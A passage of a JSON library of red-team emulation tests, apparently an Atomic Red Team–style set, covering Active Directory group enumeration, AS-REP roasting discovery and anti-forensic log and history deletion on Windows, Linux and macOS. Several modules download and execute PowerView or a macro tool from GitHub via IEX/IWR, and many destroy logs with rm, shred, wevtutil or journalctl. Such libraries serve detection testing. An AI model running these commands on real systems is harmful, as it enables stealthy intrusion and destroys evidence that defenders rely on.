      "rx_module_id": "48ddc687-82af-40b7-8472-ff1e742e8274",
      "module_name": "Adfind - Query Active Directory Groups"
    },
    {
      "index": 404,
      "technique_id": "T1069.002",
      "technique_name": "Permission Groups Discovery: Domain Groups",
      "description": "The following RAGLOX test will utilize Get-AdGroup to enumerate groups within Active Directory.\nUpon successful execution a listing of groups will output with their paths in AD.\nReference: https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-adgroup?view=windowsserver2022-ps\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Get-AdGroup -Filter *\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "3d1fcd2a-e51c-4cbe-8d84-9a843bad8dc8",
      "module_name": "Enumerate Active Directory Groups with Get-AdGroup"
    },
    {
      "index": 405,
      "technique_id": "T1069.002",
      "technique_name": "Permission Groups Discovery: Domain Groups",
      "description": "The following RAGLOX test will utilize ADSISearcher to enumerate groups within Active Directory.\nUpon successful execution a listing of groups will output with their paths in AD.\nReference: https://devblogs.microsoft.com/scripting/use-the-powershell-adsisearcher-type-accelerator-to-search-active-directory/\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "([adsisearcher]\"objectcategory=group\").FindAll(); ([adsisearcher]\"objectcategory=group\").FindOne()\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "9f4e344b-8434-41b3-85b1-d38f29d148d0",
      "module_name": "Enumerate Active Directory Groups with ADSISearcher"
    },
    {
      "index": 406,
      "technique_id": "T1069.002",
      "technique_name": "Permission Groups Discovery: Domain Groups",
      "description": "When successful, accounts that do not require kerberos pre-auth will be returned.\nReference: https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Get-ADUser -Filter 'useraccountcontrol -band 4194304' -Properties useraccountcontrol | Format-Table name\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "Computer must be domain joined.\n",
          "check_command": "if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}\n",
          "install_command": "Write-Host Joining this computer to a domain must be done manually.\n"
        },
        {
          "description": "Requires the Active Directory module for powershell to be installed.\n",
          "check_command": "if(Get-Module -ListAvailable -Name ActiveDirectory) {exit 0} else {exit 1}\n",
          "install_command": "Add-WindowsCapability -Online -Name \"Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0\"\n"
        }
      ],
      "rx_module_id": "43fa81fb-34bb-4b5f-867b-03c7dbe0e3d8",
      "module_name": "Get-ADUser Enumeration using UserAccountControl flags (AS-REP Roasting)"
    },
    {
      "index": 407,
      "technique_id": "T1069.002",
      "technique_name": "Permission Groups Discovery: Domain Groups",
      "description": "Utilizing PowerView, run Get-DomainGroupMember to identify domain users. Upon execution, progress and info about groups within the domain being scanned will be displayed.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroupMember \"Domain Admins\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "46352f40-f283-4fe5-b56d-d9a71750e145",
      "module_name": "Get-DomainGroupMember with PowerView"
    },
    {
      "index": 408,
      "technique_id": "T1069.002",
      "technique_name": "Permission Groups Discovery: Domain Groups",
      "description": "Utilizing PowerView, run Get-DomainGroup to identify the domain groups. Upon execution, Groups within the domain will be listed.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroup -verbose\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "5a8a181c-2c8e-478d-a943-549305a01230",
      "module_name": "Get-DomainGroup with PowerView"
    },
    {
      "index": 409,
      "technique_id": "T1069.002",
      "technique_name": "Permission Groups Discovery: Domain Groups",
      "description": "Output information from Active Directory to a specified file. [Ldifde](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc731033(v=ws.11)) is a CLI tool for creating, modifying and deleting directory objects.\nThe test is derived from the CISA Report on Voly Typhoon. Reference: https://media.defense.gov/2023/May/24/2003229517/-1/-1/0/CSA_Living_off_the_Land.PDF\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "ldifde.exe -f #{output_path}\\#{output_file} -p subtree\n",
        "elevation_required": true,
        "cleanup_command": "del #{output_path}\\#{output_file}\n"
      },
      "variables": [
        {
          "name": "output_path",
          "description": "Path to the file that ldifde will output",
          "type": "path",
          "default_value": "C:\\Windows\\temp"
        },
        {
          "name": "output_file",
          "description": "The filename to be created by ldifde",
          "type": "string",
          "default_value": "raglox_ldifde.txt"
        }
      ],
      "prerequisites": [
        {
          "description": "PowerShell ActiveDirectory Module must be installed\n",
          "check_command": "Try {\n    Import-Module ActiveDirectory -ErrorAction Stop | Out-Null\n    exit 0\n}\nCatch {\n    exit 1\n}\n",
          "install_command": "if((Get-CimInstance -ClassName Win32_OperatingSystem).ProductType -eq 1) {\n  Add-WindowsCapability -Name (Get-WindowsCapability -Name RSAT.ActiveDirectory.DS* -Online).Name -Online\n} else {\n  Install-WindowsFeature RSAT-AD-PowerShell\n}\n"
        }
      ],
      "rx_module_id": "22cf8cb9-adb1-4e8c-80ca-7c723dfc8784",
      "module_name": "Active Directory Enumeration with LDIFDE"
    },
    {
      "index": 410,
      "technique_id": "T1069.002",
      "technique_name": "Permission Groups Discovery: Domain Groups",
      "description": "Output information from LDAPSearch. LDAP Password is the admin-user password on Active Directory\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "ldapsearch -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{user} -w #{password} -b \"CN=Users,DC=#{domain},DC=#{top_level_domain}\" \"(objectClass=group)\" -s sub -a always -z 1000 dn \n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "domain",
          "description": "The domain to be tested",
          "type": "string",
          "default_value": "example"
        },
        {
          "name": "top_level_domain",
          "description": "The top level domain (.com, .test, .remote, etc... following domain, minus the .)",
          "type": "string",
          "default_value": "com"
        },
        {
          "name": "user",
          "description": "username@domain of a user",
          "type": "string",
          "default_value": "user@example.com"
        },
        {
          "name": "password",
          "description": "password of the user referenced inside user",
          "type": "string",
          "default_value": "s3CurePssw0rD!"
        }
      ],
      "prerequisites": [
        {
          "description": "Packages sssd-ad sssd-tools realmd adcli installed and realm available, ldapsearch\n",
          "check_command": "which ldapsearch\n",
          "install_command": "echo missing ldapsearch command; exit 1\n"
        }
      ],
      "rx_module_id": "d58d749c-4450-4975-a9e9-8b1d562755c2",
      "module_name": "Active Directory Domain Search Using LDAP - Linux (Ubuntu)/macOS"
    },
    {
      "index": 411,
      "technique_id": "T1070",
      "technique_name": "Indicator Removal on Host",
      "description": "Manages the update sequence number (USN) change journal, which provides a persistent log of all changes made to files on the volume. Upon execution, no output\nwill be displayed. More information about fsutil can be found at https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/fsutil-usn\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "fsutil usn deletejournal /D C:\n",
        "elevation_required": true,
        "cleanup_command": "fsutil usn createjournal m=1000 a=100 c:\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "b4115c7a-0e92-47f0-a61e-17e7218b2435",
      "module_name": "Indicator Removal using FSUtil"
    },
    {
      "index": 412,
      "technique_id": "T1070",
      "technique_name": "Indicator Removal on Host",
      "description": "Finds a file by user name (if Disk Quotas are enabled), queries allocated ranges for a file, sets a file's short name, sets a file's valid data length, sets zero data for a file, or creates a new file. Upon execution, no output\nwill be displayed. More information about fsutil can be found at https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/fsutil-file\n- https://tria.ge/230601-x8x6bsgb24/behavioral2\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "if (-not (Test-Path \"#{file_to_manipulate}\")) { New-Item \"#{file_to_manipulate}\" -Force } \necho \"1234567890\" > \"#{file_to_manipulate}\"\nfsutil  file setZeroData offset=0 length=#{file_data_length} \"#{file_to_manipulate}\"\n",
        "elevation_required": false,
        "cleanup_command": "rm \"#{file_to_manipulate}\"\n"
      },
      "variables": [
        {
          "name": "file_to_manipulate",
          "description": "Path of file to manipulate",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\T1070-2.txt"
        },
        {
          "name": "file_data_length",
          "description": "Data length to setzero",
          "type": "integer",
          "default_value": 10
        }
      ],
      "prerequisites": [],
      "rx_module_id": "96e86706-6afd-45b6-95d6-108d23eaf2e9",
      "module_name": "Indicator Manipulation using FSUtil"
    },
    {
      "index": 413,
      "technique_id": "T1070.001",
      "technique_name": "Indicator Removal on Host: Clear Windows Event Logs",
      "description": "Upon execution this test will clear Windows Event Logs. Open the System.evtx logs at C:\\Windows\\System32\\winevt\\Logs and verify that it is now empty.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "wevtutil cl #{log_name}\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "log_name",
          "description": "Windows Log Name, ex System",
          "type": "string",
          "default_value": "System"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "e6abb60e-26b8-41da-8aae-0c35174b0967",
      "module_name": "Clear Logs"
    },
    {
      "index": 414,
      "technique_id": "T1070.001",
      "technique_name": "Indicator Removal on Host: Clear Windows Event Logs",
      "description": "Clear event logs using built-in PowerShell commands.\nUpon successful execution, you should see the list of deleted event logs\nUpon execution, open the Security.evtx logs at C:\\Windows\\System32\\winevt\\Logs and verify that it is now empty or has very few logs in it.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$logs = Get-EventLog -List | ForEach-Object {$_.Log}\n$logs | ForEach-Object {Clear-EventLog -LogName $_ }\nGet-EventLog -list\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "b13e9306-3351-4b4b-a6e8-477358b0b498",
      "module_name": "Delete System Logs Using Clear-EventLog"
    },
    {
      "index": 415,
      "technique_id": "T1070.001",
      "technique_name": "Indicator Removal on Host: Clear Windows Event Logs",
      "description": "This module utilizes WMI via VBA to clear the Security and Backup eventlogs from the system. \n\nElevation is required for this module to execute properly, otherwise WINWORD will throw an \"Access Denied\" error\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/raglox-red-team/master/rx_modules/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\nInvoke-Maldoc -macroFile \"PathToRagloxModulesFolder\\T1070.001\\src\\T1070.001-macrocode.txt\" -officeProduct \"Word\" -sub \"ClearLogs\"\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "Microsoft Word must be installed\n",
          "check_command": "try {\n  New-Object -COMObject \"Word.Application\" | Out-Null\n  Stop-Process -Name \"winword\"\n  exit 0\n} catch { exit 1 }\n",
          "install_command": "Write-Host \"You will need to install Microsoft Word manually to meet this requirement\"\n"
        }
      ],
      "rx_module_id": "1b682d84-f075-4f93-9a89-8a8de19ffd6e",
      "module_name": "Clear Event Logs via VBA"
    },
    {
      "index": 416,
      "technique_id": "T1070.002",
      "technique_name": "Indicator Removal on Host: Clear FreeBSD, Linux or Mac System Logs",
      "description": "Delete system and audit logs\n",
      "execution": {
        "platforms": [
          "macos",
          "linux"
        ],
        "executor_type": "sh",
        "command": "sudo rm -rf #{syslog_path}\nif [ -d /var/audit ] ; then sudo rm -rf #{macos_audit_path} ; fi\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "syslog_path",
          "description": "path of syslog file to delete. On macos it's /var/log/system.log*, on linux, it's /var/log/syslog*. Also note for File events, that on macos, /var/ is a link to /private/var/.",
          "type": "string",
          "default_value": "/var/log/system.log"
        },
        {
          "name": "macos_audit_path",
          "description": "path of audit file to delete",
          "type": "string",
          "default_value": "/var/audit/20220725213300.202208110700021"
        }
      ],
      "prerequisites": [
        {
          "description": "target files must exist\n",
          "check_command": "if [ -d /var/audit ] ; then stat #{macos_audit_path} ; fi && stat #{syslog_path}\n",
          "install_command": "touch #{syslog_path}\nif [ -d /var/audit ] ; then touch #{macos_audit_path} ; fi\n"
        }
      ],
      "rx_module_id": "989cc1b1-3642-4260-a809-54f9dd559683",
      "module_name": "rm -rf"
    },
    {
      "index": 417,
      "technique_id": "T1070.002",
      "technique_name": "Indicator Removal on Host: Clear FreeBSD, Linux or Mac System Logs",
      "description": "Delete messages and security logs\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "rm -rf /var/log/messages\nrm -rf /var/log/security\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "bd8ccc45-d632-481e-b7cf-c467627d68f9",
      "module_name": "rm -rf"
    },
    {
      "index": 418,
      "technique_id": "T1070.002",
      "technique_name": "Indicator Removal on Host: Clear FreeBSD, Linux or Mac System Logs",
      "description": "This test deletes main log datastore, inflight log data, time-to-live data(TTL), fault and error content\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "sh",
        "command": "sudo log erase --all\nsudo log erase --ttl #Deletes only time-to-live log content\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "653d39cd-bae7-499a-898c-9fb96b8b5cd1",
      "module_name": "Delete log files using built-in log utility"
    },
    {
      "index": 419,
      "technique_id": "T1070.002",
      "technique_name": "Indicator Removal on Host: Clear FreeBSD, Linux or Mac System Logs",
      "description": "This test truncates the system log files using the truncate utility with (-s 0) parameter which sets file size to zero, thus emptying the file content\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "sh",
        "command": "sudo truncate -s 0 #{system_log_path} #size parameter shorthand\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "system_log_path",
          "description": "path of system log to delete.",
          "type": "string",
          "default_value": "/var/log/system.log"
        }
      ],
      "prerequisites": [
        {
          "description": "target files must exist\n",
          "check_command": "stat #{system_log_path}\n",
          "install_command": "touch #{system_log_path}\n"
        }
      ],
      "rx_module_id": "6290f8a8-8ee9-4661-b9cf-390031bf6973",
      "module_name": "Truncate system log files via truncate utility"
    },
    {
      "index": 420,
      "technique_id": "T1070.002",
      "technique_name": "Indicator Removal on Host: Clear FreeBSD, Linux or Mac System Logs",
      "description": "This test truncates the system log files using the truncate utility with (-s 0 or --size=0) parameter which sets file size to zero, thus emptying the file content\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "truncate -s 0 /var/log/messages #size parameter shorthand\ntruncate --size=0 /var/log/security #size parameter \n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "14033063-ee04-4eaf-8f5d-ba07ca7a097c",
      "module_name": "Truncate system log files via truncate utility (freebsd)"
    },
    {
      "index": 421,
      "technique_id": "T1070.002",
      "technique_name": "Indicator Removal on Host: Clear FreeBSD, Linux or Mac System Logs",
      "description": "The first sub-test truncates the log file to zero bytes via /dev/null and the second sub-test fills the log file with null bytes(zeroes) via /dev/zero, using cat utility\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "sh",
        "command": "sudo cat /dev/null > #{system_log_path} #truncating the file to zero bytes\nsudo dd if=/dev/zero bs=1000 count=5 of=#{system_log_path} #log file filled with null bytes(zeros)\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "system_log_path",
          "description": "path of system log to delete.",
          "type": "string",
          "default_value": "/var/log/system.log"
        }
      ],
      "prerequisites": [
        {
          "description": "target files must exist\n",
          "check_command": "stat #{system_log_path}\n",
          "install_command": "touch #{system_log_path}\n"
        }
      ],
      "rx_module_id": "c23bdb88-928d-493e-b46d-df2906a50941",
      "module_name": "Delete log files via cat utility by appending /dev/null or /dev/zero"
    },
    {
      "index": 422,
      "technique_id": "T1070.002",
      "technique_name": "Indicator Removal on Host: Clear FreeBSD, Linux or Mac System Logs",
      "description": "The first sub-test truncates the log file to zero bytes via /dev/null and the second sub-test fills the log file with null bytes(zeroes) via /dev/zero, using cat utility\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "cat /dev/null > /var/log/messages #truncating the file to zero bytes\ncat /dev/zero > /var/log/messages #log file filled with null bytes(zeros)\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "369878c6-fb04-48d6-8fc2-da9d97b3e054",
      "module_name": "Delete log files via cat utility by appending /dev/null or /dev/zero (freebsd)"
    },
    {
      "index": 423,
      "technique_id": "T1070.002",
      "technique_name": "Indicator Removal on Host: Clear FreeBSD, Linux or Mac System Logs",
      "description": "This test finds and deletes the system log files within /var/log/ directory using various executions(rm, shred, unlink)\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "sh",
        "command": "sudo find /var/log -name '#{system_log_name1}*' -exec rm {} \\; #using \"rm\" execution\nsudo find /var/log -name \"#{system_log_name2}*\" -exec shred -u -z -n 3 {} \\; #using \"shred\" execution\nsudo find /var/log -name \"#{system_log_name3}*\" -exec unlink {} \\; #using \"unlink\" execution\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "system_log_name1",
          "description": "name or prefix of system log to delete.",
          "type": "string",
          "default_value": "system.log"
        },
        {
          "name": "system_log_name2",
          "description": "name or prefix of system log to delete.",
          "type": "string",
          "default_value": "system.log.97.gz"
        },
        {
          "name": "system_log_name3",
          "description": "name or prefix of system log to delete.",
          "type": "string",
          "default_value": "system.log.98.gz"
        }
      ],
      "prerequisites": [
        {
          "description": "target files must exist\n",
          "check_command": "stat /var/log/#{system_log_name1} /var/log/#{system_log_name2} /var/log/#{system_log_name3}\n",
          "install_command": "touch /var/log/#{system_log_name1} /var/log/#{system_log_name2} /var/log/#{system_log_name3}\n"
        }
      ],
      "rx_module_id": "bc8eeb4a-cc3e-45ec-aa6e-41e973da2558",
      "module_name": "System log file deletion via find utility"
    },
    {
      "index": 424,
      "technique_id": "T1070.002",
      "technique_name": "Indicator Removal on Host: Clear FreeBSD, Linux or Mac System Logs",
      "description": "This test overwrites the contents of system log file with an empty string using echo utility\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "sh",
        "command": "sudo echo '' > #{system_log_path}\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "system_log_path",
          "description": "path to system.log",
          "type": "string",
          "default_value": "/var/log/system.log"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "0208ea60-98f1-4e8c-8052-930dce8f742c",
      "module_name": "Overwrite macOS system log via echo utility"
    },
    {
      "index": 425,
      "technique_id": "T1070.002",
      "technique_name": "Indicator Removal on Host: Clear FreeBSD, Linux or Mac System Logs",
      "description": "This test overwrites the contents of system log file with an empty string using echo utility\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "echo '' > /var/log/messages\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "11cb8ee1-97fb-4960-8587-69b8388ee9d9",
      "module_name": "Overwrite FreeBSD system log via echo utility"
    },
    {
      "index": 426,
      "technique_id": "T1070.002",
      "technique_name": "Indicator Removal on Host: Clear FreeBSD, Linux or Mac System Logs",
      "description": "This test reads real-time system log file and writes empty string to it, thus clearing the log file without tampering with the logging process\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "sh",
        "command": "sudo log -f /var/log/system.log | : > /var/log/system.log\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "848e43b3-4c0a-4e4c-b4c9-d1e8cea9651c",
      "module_name": "Real-time system log clearance/deletion"
    },
    {
      "index": 427,
      "technique_id": "T1070.002",
      "technique_name": "Indicator Removal on Host: Clear FreeBSD, Linux or Mac System Logs",
      "description": "This test deletes the system log file using unlink utility\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "sh",
        "command": "sudo unlink #{system_log_path}\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "system_log_path",
          "description": "path to system.log",
          "type": "string",
          "default_value": "/var/log/system.log"
        }
      ],
      "prerequisites": [
        {
          "description": "target files must exist\n",
          "check_command": "stat #{system_log_path}\n",
          "install_command": "touch #{system_log_path}\n"
        }
      ],
      "rx_module_id": "03013b4b-01db-437d-909b-1fdaa5010ee8",
      "module_name": "Delete system log files via unlink utility"
    },
    {
      "index": 428,
      "technique_id": "T1070.002",
      "technique_name": "Indicator Removal on Host: Clear FreeBSD, Linux or Mac System Logs",
      "description": "This test deletes the messages log file using unlink utility\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "unlink /var/log/messages\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "45ad4abd-19bd-4c5f-a687-41f3eee8d8c2",
      "module_name": "Delete system log files via unlink utility (freebsd)"
    },
    {
      "index": 429,
      "technique_id": "T1070.002",
      "technique_name": "Indicator Removal on Host: Clear FreeBSD, Linux or Mac System Logs",
      "description": "This test overwrites the contents of the log file with zero bytes(-z) using three passes(-n 3) of data, and then delete the file(-u) securely\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "sh",
        "command": "sudo shred -u -z -n 3 #{system_log_path}\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "system_log_path",
          "description": "path to system.log",
          "type": "string",
          "default_value": "/var/log/system.log"
        }
      ],
      "prerequisites": [
        {
          "description": "target files must exist\n",
          "check_command": "stat #{system_log_path}\n",
          "install_command": "touch #{system_log_path}\n"
        }
      ],
      "rx_module_id": "86f0e4d5-3ca7-45fb-829d-4eda32b232bb",
      "module_name": "Delete system log files using shred utility"
    },
    {
      "index": 430,
      "technique_id": "T1070.002",
      "technique_name": "Indicator Removal on Host: Clear FreeBSD, Linux or Mac System Logs",
      "description": "This test securely deletes the system log files individually and recursively using the srm utility.\nInstall srm using Homebrew with the command: brew install khell/homebrew-srm/srm\nRefer: https://github.com/khell/homebrew-srm/issues/1 for installation\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "sh",
        "command": "sudo srm #{system_log_path} #system log file deletion\nsudo srm -r #{system_log_folder} #recursive deletion of log files\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "system_log_path",
          "description": "path to system.log",
          "type": "string",
          "default_value": "/var/log/system.log"
        },
        {
          "name": "system_log_folder",
          "description": "path to log parent folder",
          "type": "string",
          "default_value": "/var/log/"
        }
      ],
      "prerequisites": [
        {
          "description": "target files must exist\n",
          "check_command": "stat #{system_log_path} #{system_log_folder}\n",
          "install_command": "mkdir -p #{system_log_folder} && touch #{system_log_path} #{system_log_folder}/system.log\n"
        }
      ],
      "rx_module_id": "b0768a5e-0f32-4e75-ae5b-d036edcf96b6",
      "module_name": "Delete system log files using srm utility"
    },
    {
      "index": 431,
      "technique_id": "T1070.002",
      "technique_name": "Indicator Removal on Host: Clear FreeBSD, Linux or Mac System Logs",
      "description": "This test deletes the system log file using osascript via \"do shell script\"(sh/bash by default) which in-turn spawns rm utility, requires admin privileges\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "sh",
        "command": "osascript -e 'do shell script \"rm #{system_log_path}\" with administrator privileges'\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "system_log_path",
          "description": "path to system.log",
          "type": "string",
          "default_value": "/var/log/system.log"
        }
      ],
      "prerequisites": [
        {
          "description": "target files must exist\n",
          "check_command": "stat #{system_log_path}\n",
          "install_command": "touch #{system_log_path}\n"
        }
      ],
      "rx_module_id": "810a465f-cd4f-47bc-b43e-d2de3b033ecc",
      "module_name": "Delete system log files using OSAScript"
    },
    {
      "index": 432,
      "technique_id": "T1070.002",
      "technique_name": "Indicator Removal on Host: Clear FreeBSD, Linux or Mac System Logs",
      "description": "This test deletes the system log file using applescript using osascript via Finder application\nNote: The user may be prompted to grant access to the Finder application before the command can be executed successfully as part of TCC(Transparency, Consent, and Control) Framework.\nRefer: https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "sh",
        "command": "osascript -e 'tell application \"Finder\" to delete POSIX file \"#{system_log_path}\"'\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "system_log_path",
          "description": "path to system.log",
          "type": "string",
          "default_value": "/var/log/system.log"
        }
      ],
      "prerequisites": [
        {
          "description": "target files must exist\n",
          "check_command": "stat #{system_log_path}\n",
          "install_command": "touch #{system_log_path}\n"
        }
      ],
      "rx_module_id": "e62f8694-cbc7-468f-862c-b10cd07e1757",
      "module_name": "Delete system log files using Applescript"
    },
    {
      "index": 433,
      "technique_id": "T1070.002",
      "technique_name": "Indicator Removal on Host: Clear FreeBSD, Linux or Mac System Logs",
      "description": "The first sub-test deletes the journal files using rm utility in the \"/var/log/journal/\" directory and the second sub-test clears the journal by modifiying time period of logs that should be retained to zero.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "sudo rm #{journal_folder}/* #physically deletes the journal files, and not just their content\nsudo journalctl --vacuum-time=0 #clears the journal while still keeping the journal files in place\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "journal_folder",
          "description": "path to journal logs",
          "type": "string",
          "default_value": "/var/log/journal"
        }
      ],
      "prerequisites": [
        {
          "description": "target files must exist\n",
          "check_command": "stat #{journal_folder}\n",
          "install_command": "mkdir -p #{journal_folder} && touch #{journal_folder}/T1070_002.journal\n"
        }
      ],
      "rx_module_id": "ca50dd85-81ff-48ca-92e1-61f119cb1dcf",
      "module_name": "Delete system journal logs via rm and journalctl utilities"
    },
    {
      "index": 434,
      "technique_id": "T1070.002",
      "technique_name": "Indicator Removal on Host: Clear FreeBSD, Linux or Mac System Logs",
      "description": "This test overwrites the Linux mail spool of a specified user. This technique was used by threat actor Rocke during the exploitation of Linux web servers.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "bash",
        "command": "echo 0> /var/spool/mail/#{username}\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "username",
          "description": "Username of mail spool",
          "type": "string",
          "default_value": "root"
        }
      ],
      "prerequisites": [
        {
          "description": "target files must exist\n",
          "check_command": "stat /var/spool/mail/#{username}\n",
          "install_command": "touch /var/spool/mail/#{username}\n"
        }
      ],
      "rx_module_id": "1602ff76-ed7f-4c94-b550-2f727b4782d4",
      "module_name": "Overwrite Linux Mail Spool"
    },
    {
      "index": 435,
      "technique_id": "T1070.002",
      "technique_name": "Indicator Removal on Host: Clear FreeBSD, Linux or Mac System Logs",
      "description": "This test overwrites the specified log. This technique was used by threat actor Rocke during the exploitation of Linux web servers.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "bash",
        "command": "echo 0> #{log_path}\n",
        "elevation_required": true,
        "cleanup_command": "if [ \"/var/log/secure\" != \"#{log_path}\" ] ; then rm -f #{log_path} ; fi\n"
      },
      "variables": [
        {
          "name": "log_path",
          "description": "Path of specified log",
          "type": "path",
          "default_value": "/var/log/secure"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "d304b2dc-90b4-4465-a650-16ddd503f7b5",
      "module_name": "Overwrite Linux Log"
    },
    {
      "index": 436,
      "technique_id": "T1070.003",
      "technique_name": "Indicator Removal on Host: Clear Command History",
      "description": "Clears bash history via rm\n",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "sh",
        "command": "rm #{history_path}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "history_path",
          "description": "Bash history path",
          "type": "path",
          "default_value": "~/.bash_history"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "a934276e-2be5-4a36-93fd-98adbb5bd4fc",
      "module_name": "Clear Bash history (rm)"
    },
    {
      "index": 437,
      "technique_id": "T1070.003",
      "technique_name": "Indicator Removal on Host: Clear Command History",
      "description": "Clears bash history via echo\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "echo \"\" > #{history_path}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "history_path",
          "description": "Bash history path",
          "type": "path",
          "default_value": "~/.bash_history"
        }
      ],
      "prerequisites": [],
